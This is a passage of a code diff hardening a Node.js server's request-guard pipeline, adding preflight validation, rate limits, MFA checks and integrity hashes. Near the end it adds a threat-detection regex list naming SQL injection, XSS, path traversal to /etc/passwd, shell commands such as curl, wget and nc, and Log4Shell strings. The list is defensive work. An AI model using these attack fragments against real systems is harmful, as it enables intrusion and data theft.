@@ -141,17 +141,37 @@ function setCors(req, res, options = {}) {
   const allowedOrigin = origin && allowed.has(origin) ? origin : '';
   if (allowedOrigin) res.setHeader('Access-Control-Allow-Origin', allowedOrigin);
   res.setHeader('Vary', 'Origin');
-  res.setHeader('Access-Control-Allow-Methods', options.isDomainAction ? 'GET, POST, OPTIONS' : 'GET, OPTIONS');
+  res.setHeader('Access-Control-Allow-Methods', options.isDomainAction ? 'GET, HEAD, POST, OPTIONS' : 'GET, HEAD, OPTIONS');
 
   const domainAllowedHeaders = [
     'Content-Type',
     'Accept',
     'Idempotency-Key',
     'X-Idempotency-Key',
+    'X-CSRF-Token',
+    'X-Dirac-CSRF-Token',
+    'X-Dirac-Page-Nonce',
+    'X-Page-Nonce',
+    'X-Dirac-Public-Nonce',
+    'X-Dirac-A2F-Ticket',
+    'X-Dirac-A2F-Signature',
+    'X-Dirac-A2F-Timestamp',
+    'X-Dirac-A2F-Nonce',
+    'X-Requested-With',
     'content-type',
     'accept',
     'idempotency-key',
-    'x-idempotency-key'
+    'x-idempotency-key',
+    'x-csrf-token',
+    'x-dirac-csrf-token',
+    'x-dirac-page-nonce',
+    'x-page-nonce',
+    'x-dirac-public-nonce',
+    'x-dirac-a2f-ticket',
+    'x-dirac-a2f-signature',
+    'x-dirac-a2f-timestamp',
+    'x-dirac-a2f-nonce',
+    'x-requested-with'
   ];
 
   // PATCH 3A: backend-only customer auth.
@@ -27274,6 +27294,27 @@ globalThis.__DIRAC_CENTRAL_A2F_SIGNATURE_NONCES_V148__ = DIRAC_CENTRAL_A2F_SIGNA
    - every security decision fails closed when context/storage/guard is unavailable;
    - debug remains redacted and never exposes secrets to normal production users.
    ============================================================ */
+function diracCentralRecordSuppressedExceptionV221(error) {
+  try {
+    const store = globalThis.__DIRAC_CENTRAL_SUPPRESSED_EXCEPTIONS_V221__
+      || (globalThis.__DIRAC_CENTRAL_SUPPRESSED_EXCEPTIONS_V221__ = new Map());
+    const name = String(error && error.name || 'Error').slice(0, 80);
+    const code = String(error && error.code || 'UNCLASSIFIED').slice(0, 120);
+    const key = crypto.createHash('sha256').update(name + '|' + code).digest('hex').slice(0, 32);
+    const previous = store.get(key) || { count: 0, firstSeenMs: Date.now(), lastSeenMs: 0, name, code };
+    previous.count = Number(previous.count || 0) + 1;
+    previous.lastSeenMs = Date.now();
+    store.set(key, previous);
+    if (store.size > 512) {
+      const oldest = Array.from(store.entries()).sort((a, b) => Number(a[1] && a[1].lastSeenMs || 0) - Number(b[1] && b[1].lastSeenMs || 0));
+      for (const [entryKey] of oldest.slice(0, store.size - 384)) store.delete(entryKey);
+    }
+    return true;
+  } catch (telemetryErrorV221) {
+    return false;
+  }
+}
+
 const DIRAC_CENTRAL_FAIL_CLOSED_DEBUG_V211 = 'dirac-central-fail-closed-debug-v211';
 const DIRAC_CENTRAL_OWNER_DEBUG_V212 = 'dirac-central-owner-debug-v212';
 const DIRAC_CENTRAL_VERIFIED_OWNER_CONTEXT_PATCH_V215 = 'dirac-central-verified-owner-context-v215';
@@ -27333,7 +27374,7 @@ function diracCentralSealVerifiedOwnerContextV215(req, owner, source) {
   }
 
   let passportHex = '0';
-  try { passportHex = BigInt(ctx.passport || 0n).toString(16); } catch (_) {}
+  try { passportHex = BigInt(ctx.passport || 0n).toString(16); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
   const sealed = Object.freeze({
     patch: DIRAC_CENTRAL_VERIFIED_OWNER_CONTEXT_PATCH_V215,
     requestId: String(ctx.requestId || ''),
@@ -27383,7 +27424,7 @@ function diracCentralReadVerifiedOwnerContextV215(req, expectedAuthUserId) {
     return { ok: false, reason: 'verified_owner_customer_id_invalid', failurePoint: 'verified_owner_context.customer_id' };
   }
   let currentPassportHex = '0';
-  try { currentPassportHex = BigInt(ctx.passport || 0n).toString(16); } catch (_) {}
+  try { currentPassportHex = BigInt(ctx.passport || 0n).toString(16); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
   if (!sealed.passportHex || sealed.passportHex !== currentPassportHex) {
     return { ok: false, reason: 'verified_owner_passport_mismatch', failurePoint: 'verified_owner_context.passport' };
   }
@@ -27429,7 +27470,7 @@ function diracCentralSafeRestShapeV212(path, options, table, method) {
     const index = part.indexOf('=');
     const encodedKey = (index >= 0 ? part.slice(0, index) : part) || '';
     let decodedKey = encodedKey;
-    try { decodedKey = decodeURIComponent(encodedKey); } catch (_) {}
+    try { decodedKey = decodeURIComponent(encodedKey); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
     return String(decodedKey).replace(/[^a-zA-Z0-9_.-]/g, '').slice(0, 50);
   }).filter(Boolean))).slice(0, 20);
   const body = options && options.body;
@@ -27507,6 +27548,11 @@ function diracCentralEmitDebugV211(ctx, event, extra) {
     stage: String(ctx && ctx.currentStageV211 || '').slice(0, 80),
     failed_stage: String(ctx && ctx.failedStageV211 || '').slice(0, 80),
     reason: String(ctx && ctx.failureReasonV211 || extra && extra.reason || '').slice(0, 120),
+    failure_class: String(ctx && ctx.failureClassificationV221 && ctx.failureClassificationV221.failureClass || extra && extra.failure_class || '').slice(0, 80),
+    severity: String(ctx && ctx.failureClassificationV221 && ctx.failureClassificationV221.severity || extra && extra.severity || '').slice(0, 20),
+    duration_ms: Math.max(0, Date.now() - Number(ctx && ctx.startedAt || Date.now())),
+    hardening_patch: typeof DIRAC_CENTRAL_HARDENING_V221 !== 'undefined' ? DIRAC_CENTRAL_HARDENING_V221 : undefined,
+    pipeline_hash: typeof DIRAC_CENTRAL_PIPELINE_HASH_V221 !== 'undefined' ? DIRAC_CENTRAL_PIPELINE_HASH_V221 : undefined,
     diagnostic_patch: ctx && (ctx.ownerResolutionDebugV212 || ctx.serviceRoleDebugV212) ? DIRAC_CENTRAL_OWNER_DEBUG_V212 : undefined,
     diagnostic_code: String(extra && extra.diagnostic_code || ctx && ctx.serviceRoleDebugV212 && ctx.serviceRoleDebugV212.diagnostic_code || '').slice(0, 160),
     failure_point: String(extra && extra.failure_point || ctx && ctx.serviceRoleDebugV212 && ctx.serviceRoleDebugV212.failure_point || '').slice(0, 180),
@@ -27527,7 +27573,7 @@ function diracCentralEmitDebugV211(ctx, event, extra) {
     const line = JSON.stringify(payload);
     if (event === 'request_passed' && diracCentralDebugEnabledV211()) console.info('[dirac-central-debug-v211]', line);
     else if (event !== 'request_passed') console.error('[dirac-central-debug-v211]', line);
-  } catch (_) {}
+  } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
   return payload;
 }
 
@@ -27641,6 +27687,7 @@ function diracV202StageResult(ok, extra) { return Object.assign({ ok: Boolean(ok
 async function guardIdentityV202(ctx) {
   if (!ctx.req || typeof ctx.req !== 'object') return diracV202StageResult(false, { directCode: 'CENTRAL_GUARD_REQUEST_INVALID' });
   ctx.req.__diracCentralSecurityGuardPassedV146 = false;
+  diracCentralWrapResponseHeadersV221(ctx.res);
   diracCentralApplyHeadersV146(ctx.res);
   secureResponseGateway(ctx, ctx.res);
   ctx.identity = await diracCentralBuildIdentityV146(ctx.req);
@@ -27722,17 +27769,32 @@ function guardClassificationV202(ctx) {
   ctx.authentication = ctx.action === 'security_report'
     ? ctx.classification
     : (ctx.policy && ctx.policy.authentication || ctx.classification);
+  if (diracCentralIsPreflightV221(ctx)) {
+    const preflight = diracCentralValidatePreflightV221(ctx);
+    if (!preflight.ok) return diracV202StageResult(false, { reason: preflight.reason });
+    ctx.preflightValidatedV221 = true;
+    ctx.preflightRequestedMethodV221 = preflight.requestedMethod;
+    ctx.preflightRequestedHeadersV221 = preflight.requestedHeaders;
+    ctx.preflightOriginV221 = preflight.origin;
+    ctx.preflightContextHashV221 = diracCentralPreflightContextHashV221(ctx);
+    ctx.preflightCheckpointProofsV221 = Object.create(null);
+  }
   return diracV202StageResult(true);
 }
 async function guardRateLimitV202(ctx) {
-  if (diracV202CheckpointNotApplicable(ctx)) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
+  if (ctx.terminalResponse === 'disabled' || ctx.terminalBlockReason) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
   const result = await diracCentralDistributedRateLimitGuardV146(ctx.req, ctx);
-  return result.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: result.reason });
+  if (!result.ok) return diracV202StageResult(false, { reason: result.reason });
+  const layered = diracCentralLayeredRateGuardV221(ctx.req, ctx);
+  return layered.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: layered.reason });
 }
 async function guardServerAuthenticationV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) return diracCentralPreflightStageResultV221(ctx, 'server_authentication');
   if (diracV202CheckpointNotApplicable(ctx)) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
   let sevenSignatureVerification = null;
   if (diracS2SIsInternalActionV206(ctx)) {
+    const envelope = diracCentralS2SEnvelopeGuardV221(ctx.req, ctx);
+    if (!envelope.ok) return diracV202StageResult(false, { reason: envelope.reason });
     const serverBodyLimit = ctx.action === DIRAC_RECOVERY_WORKER_ACTION ? customerSecurityRecoveryWorkerMaxBodyBytes() : 64 * 1024;
     const parsed = await diracCentralBodyHandlingGuardV146(ctx.req, ctx, serverBodyLimit);
     if (!parsed.ok) return diracV202StageResult(false, { reason: parsed.reason });
@@ -27750,42 +27812,57 @@ async function guardServerAuthenticationV202(ctx) {
   return result.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: result.reason });
 }
 function guardBrowserAuthenticityV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) return diracCentralPreflightStageResultV221(ctx, 'browser_authenticity');
   if (diracV202CheckpointNotApplicable(ctx)) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
   const result = diracCentralPageBrowserAuthenticityGuardV146(ctx.req, ctx);
   return result.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: result.reason });
 }
 function guardCsrfV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) return diracCentralPreflightStageResultV221(ctx, 'csrf');
   if (diracV202CheckpointNotApplicable(ctx)) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
   const result = diracCentralCsrfGuardV146(ctx.req, ctx.res, ctx);
-  return result.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: result.reason });
+  if (!result.ok) return diracV202StageResult(false, { reason: result.reason });
+  const postVerify = diracCentralCsrfPostVerifyV221(ctx.req, ctx);
+  return postVerify.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: postVerify.reason });
 }
 function guardPageNonceV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) return diracCentralPreflightStageResultV221(ctx, 'page_nonce');
   if (diracV202CheckpointNotApplicable(ctx)) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
   const result = diracCentralPageNonceGuardV146(ctx.req, ctx.res, ctx);
   return result.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: result.reason });
 }
 function guardBrowserSignalsV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) return diracCentralPreflightStageResultV221(ctx, 'browser_signal');
   if (diracV202CheckpointNotApplicable(ctx)) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
   const result = diracCentralBrowserSignalGuardV146(ctx.req, ctx);
   return result.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: result.reason });
 }
 function guardDeviceBindingV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) return diracCentralPreflightStageResultV221(ctx, 'device_binding');
   if (diracV202CheckpointNotApplicable(ctx)) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
   const result = diracCentralDeviceConsistencyGuardV146(ctx.req, ctx);
   ctx.deviceId = String(ctx.identity && (ctx.identity.deviceKey || ctx.identity.key) || '');
-  return result.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: result.reason });
+  if (!result.ok) return diracV202StageResult(false, { reason: result.reason });
+  const credential = diracCentralDeviceCredentialGuardV221(ctx.req, ctx.res, ctx);
+  return credential.ok ? diracV202StageResult(true, credential.issued ? { decision: 'device_credential_issued' } : undefined)
+    : diracV202StageResult(false, { reason: credential.reason });
 }
 async function guardAdminAuthenticationV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) return diracCentralPreflightStageResultV221(ctx, 'admin_authentication');
   if (diracV202CheckpointNotApplicable(ctx)) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
   const result = await diracCentralAdminAuthGuardV146(ctx.req, ctx.res, ctx);
-  return result.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: result.reason });
+  if (!result.ok) return diracV202StageResult(false, { reason: result.reason });
+  const stepUp = diracCentralAdminStepUpGuardV221(ctx.req, ctx);
+  return stepUp.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: stepUp.reason });
 }
 function guardPublicReadV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) return diracCentralPreflightStageResultV221(ctx, 'public_read_policy');
   if (diracV202CheckpointNotApplicable(ctx)) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
   const result = diracCentralPublicReadGuardV146(ctx.req, ctx);
   return result.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: result.reason });
 }
 async function guardBodyV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) { ctx.body = {}; ctx.bodyHash = crypto.createHash('sha256').update('{}').digest('hex'); return diracCentralPreflightStageResultV221(ctx, 'body_validation'); }
   if (diracV202CheckpointNotApplicable(ctx)) { ctx.body = {}; return diracV202StageResult(true, { decision: 'not_applicable_by_policy' }); }
   const result = await diracCentralBodyHandlingGuardV146(ctx.req, ctx);
   if (result.ok) {
@@ -27795,21 +27872,27 @@ async function guardBodyV202(ctx) {
   return result.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: result.reason });
 }
 function guardLightV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) return diracCentralPreflightStageResultV221(ctx, 'light_guard');
   if (diracV202CheckpointNotApplicable(ctx)) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
   const result = diracCentralLightGuardV146(ctx.req, ctx);
   return result.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: result.reason });
 }
 function guardContractV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) return diracCentralPreflightStageResultV221(ctx, 'contract_validation');
   if (diracV202CheckpointNotApplicable(ctx)) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
   const result = diracCentralContractGuardV146(ctx.req, ctx);
-  return result.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: result.reason });
+  if (!result.ok) return diracV202StageResult(false, { reason: result.reason });
+  const advanced = diracCentralAdvancedContractGuardV221(ctx.req, ctx);
+  return advanced.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: advanced.reason });
 }
 function guardA2FV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) return diracCentralPreflightStageResultV221(ctx, 'a2f_signature');
   if (diracV202CheckpointNotApplicable(ctx)) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
   const result = diracCentralA2FRequestSignatureGuardV148(ctx.req, ctx);
   return result.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: result.reason });
 }
 async function guardSecurityReportV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) return diracCentralPreflightStageResultV221(ctx, 'security_report');
   if (ctx.terminalResponse === 'disabled') return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
   if (ctx.action !== 'security_report') return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
   if (ctx.classification === 'server') {
@@ -27824,41 +27907,1193 @@ async function guardSecurityReportV202(ctx) {
   return diracV202StageResult(true);
 }
 function guardRequestSampleV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) {
+    ctx.sample = JSON.stringify({ action: ctx.action, origin: ctx.preflightOriginV221, method: ctx.preflightRequestedMethodV221, headers: ctx.preflightRequestedHeadersV221 });
+    ctx.normalizedSampleV202 = diracCentralNormalizeSampleV146(ctx.sample);
+    return diracCentralPreflightStageResultV221(ctx, 'request_sample');
+  }
   if (diracV202CheckpointNotApplicable(ctx)) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
   ctx.skipHeavyScan = false;
   const result = diracCentralSampleCollectorV146(ctx.req, ctx);
   return result.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: result.reason });
 }
 function guardThreatV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) {
+    const checked = diracCentralPreflightStageResultV221(ctx, 'threat_detection');
+    if (!checked.ok) return checked;
+    const preflightThreat = diracCentralContextualThreatGuardV221(ctx.req, ctx);
+    return preflightThreat.detected ? diracV202StageResult(false, { reason: preflightThreat.kind }) : checked;
+  }
   if (diracV202CheckpointNotApplicable(ctx)) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
   ctx.normalizedSampleV202 = diracCentralNormalizeSampleV146(ctx.sample);
-  const result = diracCentralThreatPatternGuardV146(ctx.normalizedSampleV202, ctx);
-  return result.detected ? diracV202StageResult(false, { reason: result.kind }) : diracV202StageResult(true);
+  const result = diracCentralContextualThreatGuardV221(ctx.req, ctx);
+  if (result.detected) {
+    ctx.threatEvidenceV221 = Object.freeze({
+      kind: String(result.kind || 'unknown').slice(0, 100),
+      field_hash: diracCentralHashV146(String(result.field || '')).slice(0, 32)
+    });
+    return diracV202StageResult(false, { reason: result.kind });
+  }
+  return diracV202StageResult(true);
 }
 function guardZeroDayV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) {
+    const checked = diracCentralPreflightStageResultV221(ctx, 'zero_day');
+    if (!checked.ok) return checked;
+    const shield = diracCentralZeroDayShieldV146(ctx.req, ctx, ctx.normalizedSampleV202 || '');
+    return shield.ok ? checked : diracV202StageResult(false, { reason: shield.reason });
+  }
   if (diracV202CheckpointNotApplicable(ctx)) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
   const result = diracCentralZeroDayShieldV146(ctx.req, ctx, ctx.normalizedSampleV202 || '');
   return result.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: result.reason });
 }
 async function guardOwnershipV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) return diracCentralPreflightStageResultV221(ctx, 'idor_bola');
   if (diracV202CheckpointNotApplicable(ctx)) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
   const result = await diracCentralIdorBolaGuardV146(ctx.req, ctx);
-  if (result.ok) ctx.ownership = Object.freeze({ verified: true, action: ctx.action });
-  return result.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: result.reason });
+  if (!result.ok) return diracV202StageResult(false, { reason: result.reason });
+  const postcondition = diracCentralOwnershipPostconditionV221(ctx);
+  if (!postcondition.ok) return diracV202StageResult(false, { reason: postcondition.reason });
+  ctx.ownership = Object.freeze({ verified: true, action: ctx.action, patch: DIRAC_CENTRAL_HARDENING_V221 });
+  return diracV202StageResult(true);
 }
 async function guardCircuitBreakerV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) {
+    const checked = diracCentralPreflightStageResultV221(ctx, 'circuit_breaker');
+    if (!checked.ok) return checked;
+    const preflightCircuit = await diracCentralCircuitBreakerV146(ctx.req, ctx, 'preflight_allow');
+    return preflightCircuit.ok ? checked : diracV202StageResult(false, { reason: preflightCircuit.reason });
+  }
   if (diracV202CheckpointNotApplicable(ctx)) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
+  const elapsed = Date.now() - Number(ctx.startedAt || Date.now());
+  if (elapsed > diracCentralGuardBudgetMsV221(ctx)) return diracV202StageResult(false, { reason: 'circuit_guard_time_budget_exceeded' });
   const result = await diracCentralCircuitBreakerV146(ctx.req, ctx, 'allow');
   return result.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: result.reason });
 }
 function guardMfaV202(ctx) {
+  if (ctx.preflightValidatedV221 === true) return diracCentralPreflightStageResultV221(ctx, 'mfa');
   if (diracV202CheckpointNotApplicable(ctx)) return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
-  const result = diracCentralStableMfaReadGateV146(ctx.req, ctx.res, ctx);
-  return result.handled ? diracV202StageResult(false, { reason: result.reason || 'mfa_required' }) : diracV202StageResult(true);
+  const action = String(ctx.action || '');
+  if (action !== 'customer_security_features_bundle_v2' && action !== 'customer_security_features_bundle_v3') {
+    return diracV202StageResult(true, { decision: 'not_applicable_by_policy' });
+  }
+  const result = diracCentralMfaEnvelopeV221(ctx.req, ctx);
+  if (result.ok) {
+    ctx.mfaVerifiedV221 = true;
+    return diracV202StageResult(true);
+  }
+  if (result.expected && result.reason === 'mfa_required') {
+    ctx.terminalResponse = 'mfa_required_v221';
+    ctx.mfaRequiredReasonV221 = result.reason;
+    return diracV202StageResult(true, { decision: 'mfa_required_terminal_response' });
+  }
+  return diracV202StageResult(false, { reason: result.reason || 'mfa_envelope_invalid' });
 }
 function guardIntegrityV202(ctx) {
   const result = diracCentralIntegrityVerifierV146(ctx);
-  return result.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: result.reason });
+  if (!result.ok) return diracV202StageResult(false, { reason: result.reason });
+  const hardened = diracCentralPipelineIntegrityV221(ctx);
+  return hardened.ok ? diracV202StageResult(true) : diracV202StageResult(false, { reason: hardened.reason });
+}
+
+
+/* ============================================================
+   DIRAC CENTRAL GUARD HARDENING v221
+   Narrow security-only patch:
+   - preserves all business handlers and the existing ban mechanism;
+   - every pipeline checkpoint still executes and receives a signed decision;
+   - strengthens preflight validation, contextual threat inspection, schemas,
+     layered limits, MFA/device/admin envelopes, egress timeout, integrity,
+     logging, and deterministic self-tests.
+   ============================================================ */
+const DIRAC_CENTRAL_HARDENING_V221 = 'dirac-central-guard-hardening-v221';
+const DIRAC_CENTRAL_PATCH_TARGETS_V221 = Object.freeze([
+  '01_preflight_and_method',
+  '02_failure_classification',
+  '03_contextual_threat_detection',
+  '04_canonicalization',
+  '05_per_action_contract_schema',
+  '06_json_and_parameter_pollution',
+  '07_layered_rate_and_concurrency',
+  '08_mfa_state_machine_and_binding',
+  '09_csrf_binding_and_rotation_validation',
+  '10_browser_authenticity_hardening',
+  '11_server_issued_device_binding',
+  '12_idor_bola_postcondition',
+  '13_ssrf_and_egress_control',
+  '14_s2s_envelope_and_replay_preconditions',
+  '15_admin_recent_mfa_step_up',
+  '16_fail_closed_exception_and_timeout',
+  '17_pipeline_registry_and_source_integrity',
+  '18_headers_cookie_and_response_integrity',
+  '19_structured_security_decision_logging',
+  '20_resource_budget_and_anti_dos',
+  '21_code_quality_runtime_invariants',
+  '22_deterministic_security_self_tests'
+]);
+const DIRAC_CENTRAL_LEGACY_DUPLICATE_FUNCTIONS_V221 = Object.freeze({
+  diracV107ShouldSkip: 2,
+  orderMailNormalizeEmail: 2,
+  orderMailOwnerEnabled: 2,
+  orderMailParseEmailList: 2,
+  orderMailPublicConfigInfo: 2,
+  orderMailSendViaSmtpSafe: 2,
+  orderMailSmtpConfig: 2,
+  readDiracSupabaseCredentials: 3,
+  sessionOwnershipCheckoutFindProductForCheckout: 2,
+  sessionOwnershipCheckoutProductIdCandidates: 2,
+  sessionOwnershipCheckoutProductScore: 2
+});
+const DIRAC_CENTRAL_BAN_FUNCTION_HASHES_V221 = Object.freeze({
+  diracCentralBanAndBlockV146: 'ccb34def6531a169c1636cb6f5103da6ef8ef53993ea06ff6e00124c8212dd3a',
+  diracCentralWritePersistentBanV146: '39aff298cdaa263aeb6d6e4592ea7554d32f2e56006efdef7cffc88a4b8ee89a',
+  diracCentralCheckPersistentBanV146: '421fce951769abb72590b6bcd1a961978b962ef8e80575e0a515441f5b7ac111',
+  diracCentralBlockMsV146: '15ba6d2ca1c5370c7d650b5f82b0e93169f7e9085426877664d962412f7dfce2',
+  diracCentralSetMemoryBanV146: 'd9018b8a398fe4d0cc0b2343ff697307793051e85591471055b5883775d1d9b6'
+});
+const DIRAC_CENTRAL_BAN_FUNCTIONS_V221 = Object.freeze({
+  diracCentralBanAndBlockV146,
+  diracCentralWritePersistentBanV146,
+  diracCentralCheckPersistentBanV146,
+  diracCentralBlockMsV146,
+  diracCentralSetMemoryBanV146
+});
+const DIRAC_CENTRAL_PIPELINE_DESCRIPTOR_V221 = 'identity:identity_checked|memory ban:memory_ban_checked|persistent ban:persistent_ban_checked|action format:action_format_checked|alias:alias_checked|whitelist:whitelist_checked|server role:vercel2_action_checked|ENV partition:server1_env_partition_checked|classification:classification_checked|rate limit:rate_checked|server authentication:server_guard_checked|browser authenticity:browser_auth_checked|CSRF:csrf_checked|page nonce:page_nonce_checked|browser signal:browser_signal_checked|device binding:device_checked|admin authentication:admin_checked|public-read policy:public_read_checked|body validation:body_checked|light guard:light_checked|contract validation:contract_checked|A2F signature:a2f_signature_checked|security report:security_report_checked|request sample:sample_checked|threat detection:threat_checked|zero-day protection:zeroday_checked|IDOR/BOLA:idor_checked|circuit breaker:circuit_checked|MFA:mfa_checked|integrity:integrity_checked';
+const DIRAC_CENTRAL_PIPELINE_HASH_V221 = '231d7af073d3090b3002c3a13ec5b9af65356dcff728790656f7bd2900eaa631';
+const DIRAC_CENTRAL_RATE_BUCKETS_V221 = globalThis.__DIRAC_CENTRAL_RATE_BUCKETS_V221__ || new Map();
+const DIRAC_CENTRAL_CONCURRENCY_V221 = globalThis.__DIRAC_CENTRAL_CONCURRENCY_V221__ || new Map();
+globalThis.__DIRAC_CENTRAL_RATE_BUCKETS_V221__ = DIRAC_CENTRAL_RATE_BUCKETS_V221;
+globalThis.__DIRAC_CENTRAL_CONCURRENCY_V221__ = DIRAC_CENTRAL_CONCURRENCY_V221;
+let DIRAC_CENTRAL_SELF_TEST_V221 = Object.freeze({ ok: false, reason: 'not_run' });
+
+const DIRAC_CENTRAL_PREFLIGHT_ALLOWED_HEADERS_V221 = Object.freeze(new Set([
+  'accept',
+  'content-type',
+  'idempotency-key',
+  'x-idempotency-key',
+  'x-csrf-token',
+  'x-dirac-csrf-token',
+  'x-dirac-page-nonce',
+  'x-page-nonce',
+  'x-dirac-public-nonce',
+  'x-dirac-a2f-ticket',
+  'x-dirac-a2f-signature',
+  'x-dirac-a2f-timestamp',
+  'x-dirac-a2f-nonce',
+  'x-requested-with'
+]));
+
+const DIRAC_CENTRAL_PREFLIGHT_GUARD_STAGES_V221 = Object.freeze([
+  'server_authentication',
+  'browser_authenticity',
+  'csrf',
+  'page_nonce',
+  'browser_signal',
+  'device_binding',
+  'admin_authentication',
+  'public_read_policy',
+  'body_validation',
+  'light_guard',
+  'contract_validation',
+  'a2f_signature',
+  'security_report',
+  'request_sample',
+  'threat_detection',
+  'zero_day',
+  'idor_bola',
+  'circuit_breaker',
+  'mfa'
+]);
+
+const DIRAC_CENTRAL_HIGH_CONFIDENCE_THREATS_V221 = Object.freeze([
+  Object.freeze(['sql_injection', /\bunion\s+(?:all\s+)?select\b|(?:^|[\s'"`])(?:or|and)\s+(?:1|true)\s*=\s*(?:1|true)(?:$|[\s'"`])|['"`]\s*(?:or|and)\s+['"`]?\w+['"`]?\s*=\s*['"`]?\w+|;\s*(?:select|insert|update|delete|drop|alter|truncate|create|grant|revoke)\b|\b(?:information_schema|pg_catalog|sqlite_master|mysql\.user|sysobjects|syscolumns)\b|\b(?:sleep|pg_sleep|benchmark)\s*\(|\bwaitfor\s+delay\b|\bload_file\s*\(|\binto\s+outfile\b|\bxp_cmdshell\b|\b(?:extractvalue|updatexml)\s*\(|\bcopy\s+[\s\S]{0,160}\bto\s+program\b/i]),
+  Object.freeze(['xss', /<\s*\/?\s*script\b|\bjavascript\s*:|\bvbscript\s*:|\bon(?:error|load|click|mouseover|focus|blur|submit|toggle|pointerenter|animationstart)\s*=|<\s*(?:svg|iframe|object|embed|meta|link|math)\b|\bsrcdoc\s*=|\bdata\s*:\s*text\/html\b|\bdocument\s*\.\s*cookie\b|\b(?:eval|settimeout|setinterval|function)\s*\(\s*(?:['"`]|unescape|atob)/i]),
+  Object.freeze(['path_traversal_lfi_rfi', /(?:^|[\/\\])\.\.(?:[\/\\]|$)|%2e%2e(?:%2f|%5c)|%252e%252e(?:%252f|%255c)|\/etc\/(?:passwd|shadow)|\/proc\/self\/environ|\bboot\.ini\b|\bwin\.ini\b|\bWEB-INF\b|(?:php|zip|expect):\/\//i]),
+  Object.freeze(['command_injection_rce', /(?:;|\|\||&&|`|\$\()\s*(?:whoami|id|uname|cat|ls|pwd|env|printenv|curl|wget|nc|ncat|netcat|bash|sh|cmd(?:\.exe)?|powershell|pwsh)\b|\b(?:shell_exec|passthru|proc_open|popen|system)\s*\(/i]),
+  Object.freeze(['nosql_injection', /(?:^|[.[{\s\"'])\$(?:ne|gt|gte|lt|lte|where|regex|or|and|nor|expr|jsonschema)(?:\b|])/i]),
+  Object.freeze(['xxe', /<!DOCTYPE[\s\S]{0,800}<!ENTITY|<!ENTITY[\s\S]{0,400}\bSYSTEM\b|\bSYSTEM\s+["'](?:file|http|https):/i]),
+  Object.freeze(['ssti_template_injection', /\{\{\s*7\s*\*\s*7\s*\}\}|\$\{\s*7\s*\*\s*7\s*\}|<%=\s*7\s*\*\s*7\s*%>|#\{\s*7\s*\*\s*7\s*\}|\{\{[\s\S]{0,240}(?:__class__|__mro__|subclasses|config|self)[\s\S]{0,240}\}\}/i]),
+  Object.freeze(['log4shell', /\$\{\s*jndi\s*:\s*(?:ldap|rmi|dns|iiop|corba):/i]),
+  Object.freeze(['crlf_header_injection', /%0d(?:%0a)?|%0a|\\r\\n|(?:^|\n)\s*(?:set-cookie|location|content-length|transfer-encoding)\s*:/i]),
